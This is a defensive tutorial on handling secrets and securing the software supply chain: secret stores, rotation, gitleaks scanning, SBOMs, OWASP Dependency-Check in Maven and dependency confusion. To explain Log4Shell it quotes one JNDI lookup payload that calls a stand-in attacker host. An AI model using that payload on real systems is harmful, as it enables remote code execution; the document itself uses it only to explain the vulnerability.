# Secrets and the software supply chain

> **In one sentence:** A secret belongs in a secret store and reaches the process at runtime, never in a repository, an image or a log; a dependency is code you run without reading, so you need to know exactly which versions you run, learn within hours when one is vulnerable, and be able to replace it the same day.

**Why it matters:** The two most common ways a backend gets compromised today have little to do with its own code: a credential someone committed and a bot found within minutes, and a library with a known hole that nobody noticed was on the classpath. Log4Shell in December 2021 turned the second into a weekend for the whole industry. Both are solved by habits and a little tooling rather than cleverness, which is why interviewers ask "how do you handle secrets?" and "what did you do about Log4Shell?".

## The idea

**Secrets.** A secret is anything whose disclosure grants access: database passwords, API keys, signing keys, OAuth client secrets, TLS private keys. The rules:

1. Never in the repository. Git history is permanent, and mirrors, forks, CI caches and scanning bots keep copies; rewriting history afterwards is cleanup, not remediation. Ignore the local files (`.env`, `application-local.properties`) and scan every commit.
2. Never in images. A `COPY .env` or a build argument carrying a token ends up in a layer that `docker history` and any registry reader can see. Build-time secrets use BuildKit's `--mount=type=secret`, which never touches a layer.
3. Injected at runtime. Environment variables are the common denominator (and appear in `/proc/<pid>/environ`, `docker inspect` and crash dumps, so they are the floor, not the ceiling); files mounted from Kubernetes Secrets are better; a **vault** (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager) read at start-up with the workload's own identity is best, because there is no bootstrap secret to protect and every read is audited. Spring Boot treats all of these as property sources; Spring Cloud Vault and Spring Cloud AWS plug into `spring.config.import`.
4. Rotated. A secret that cannot be rotated without downtime will never be rotated. Design for two valid versions at once and automate the switch.
5. Scanned. `gitleaks` finds secrets in history and, as a pre-commit hook, stops new ones; GitHub's push protection does the same server-side.
6. Treated as compromised the moment they leak. Rotate first, investigate second, clean the repository third.

**Dependencies.** Your application is a thin layer over hundreds of libraries, most of them transitive, each a potential way in. The risks: **known vulnerabilities** (a published CVE that attackers are already scanning for), **malicious packages** (typosquatting a popular name, a hijacked maintainer account, or **dependency confusion**: a public package with the same name as your internal one and a higher version, which the build happily prefers) and compromised build pipelines. The controls:

- **Know what you run.** A Software Bill of Materials (SBOM, in CycloneDX or SPDX format) lists every component and version in a build. It is what let teams answer "do we run Log4j anywhere?" in minutes instead of days.
- **Pin and lock.** Maven resolves declared versions deterministically, but version ranges and `LATEST` reintroduce surprises; a BOM such as `spring-boot-dependencies` pins the transitive graph. Gradle has dependency locking; npm has `package-lock.json` with `npm ci`. A build that resolves different versions on different days is neither reproducible nor auditable.
- **Scan continuously** with software composition analysis (SCA): OWASP Dependency-Check, Trivy, Snyk, GitHub's Dependabot alerts, or Dependency-Track over your SBOMs. On every build and on a schedule, because new CVEs appear for old builds.
- **Update routinely.** Renovate or Dependabot pull requests keep the gap to the patched version small, so an emergency upgrade is a minor bump rather than three majors.
- **Route through one registry.** A repository manager (Nexus, Artifactory) that proxies Maven Central and hosts internal artifacts, with builds allowed to talk only to it, closes dependency confusion and gives you a place to block bad versions.

**Log4Shell as the lesson.** CVE-2021-44228: Log4j 2 (2.0-beta9 to 2.14.1) evaluated `${...}` lookups inside logged messages, including `${jndi:ldap://attacker.example/x}`, which fetched and executed remote code. Anything that logged user input (a `User-Agent`, a username) was exploitable, and most teams did not know which services carried Log4j transitively. The teams that coped had three things: an inventory that answered "where?" in minutes, a pipeline that could rebuild and deploy every service the same day, and egress filtering that blocked the callbacks to attacker servers while patching happened. None of those is a Log4j fix; they are the properties that turn the next Log4Shell into a long day instead of a breach.

## Example: Dependency-Check in Maven, and what to do after a leak

OWASP Dependency-Check matches your dependencies against the National Vulnerability Database and fails the build above a severity you choose:

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>${dependency-check.version}</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <nvdApiKey>${env.NVD_API_KEY}</nvdApiKey>
        <suppressionFiles>
            <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
        </suppressionFiles>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

Pin `dependency-check.version` to the current release in `<properties>`. The NVD requires a free API key for a usable download speed, and it comes from the CI secret store, not from the pom. The report lands in `target/dependency-check-report.html`. The suppression file is where you record, with a reason and an expiry date, the findings you have judged not to apply; without it the build goes red on a false positive and someone disables the plugin. An SBOM takes one command, `mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom`, which writes `target/bom.json` for Dependency-Track or `trivy sbom` to consume.

The leak scanner, over history and at commit time (older releases spell these `gitleaks detect` and `gitleaks protect`):

```bash
gitleaks git --redact .
gitleaks git --pre-commit --staged --redact
```

When a secret has leaked anyway (committed, pasted into a ticket, printed in a log), the order matters:

1. Rotate it now, within minutes, before investigating. Bots scan public repositories continuously; assume it has been used.
2. Check for misuse in the provider's audit log (CloudTrail, the database's connection log, the API's usage dashboard) from the time of the leak, not the time of discovery.
3. Remove it from history with `git filter-repo`, force-push, have everyone re-clone, and ask the hosting provider to purge cached views. This stops the spread; it does not un-leak anything.
4. Add the prevention that was missing: the pre-commit hook, push protection, or the log scrubber.

The rotation checklist for a secret that has not leaked, which is how you make sure step 1 is possible when one has:

1. Inventory every consumer of the secret: services, CI jobs, scripts, people.
2. Create the new version while the old one stays valid.
3. Roll consumers onto the new version (restart, or hot reload where supported).
4. Verify nothing still uses the old version; the provider's logs show which credential each call used.
5. Revoke the old version.
6. Record the rotation and schedule the next; a rotation nobody has rehearsed will fail during the incident.

## Pitfalls

- "It is a private repository." Private repositories leak through laptops, forks, CI logs and acquisitions, and the secret is still in the history after you delete the file.
- Dev credentials committed "just for local". They have a way of becoming production credentials, or of pointing at production.
- Rewriting history instead of rotating. The secret is already in someone's clone, cache or scanner output.
- Logging configuration at start-up. A `DEBUG` line that prints resolved properties prints the secrets; mask them, and never log request headers that carry tokens.
- Treating the SCA report as the deliverable. A red build with forty findings and no owner gets disabled; triage, suppress with reasons, fix the rest, and fail only on what matters.
- Internal artifact names that could exist publicly, with builds that can reach public registries directly. That is the dependency confusion setup.
- Pinning a GitHub Action to a tag. Tags move; a compromised action ships to everyone who trusted `@v3`. Pin the commit SHA.

## Check yourself

1. A colleague deleted a committed AWS key in the next commit and says the problem is solved. List what still needs to happen, in order.
2. Why is an environment variable a weaker place for a secret than a file mounted from a secret store, and when is it still acceptable?
3. How does an SBOM change your response time to the next Log4Shell, and which two other capabilities mattered as much in December 2021?
4. Explain dependency confusion and the two configuration changes that prevent it.

## Go deeper

- [OWASP: Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) · the lifecycle: storage, injection, rotation, auditing.
- [gitleaks](https://github.com/gitleaks/gitleaks) · the scanner, with the pre-commit configuration.
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) · the SCA tool configured above; the Maven plugin documentation covers every parameter.
- [GitHub Advisory Database](https://github.com/advisories) · the vulnerability data behind Dependabot, searchable by package.
- [CycloneDX](https://cyclonedx.org/) · the SBOM standard and the tools that produce and consume it.
- [OWASP: Software Supply Chain Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html) · the wider picture: build integrity, provenance and SLSA.
- [Apache Logging Services: Security](https://logging.apache.org/log4j/2.x/security.html) · the primary source for the Log4Shell CVEs and the fixed versions.

---

Part of [Security](../README.md) · items 9.1, 9.2
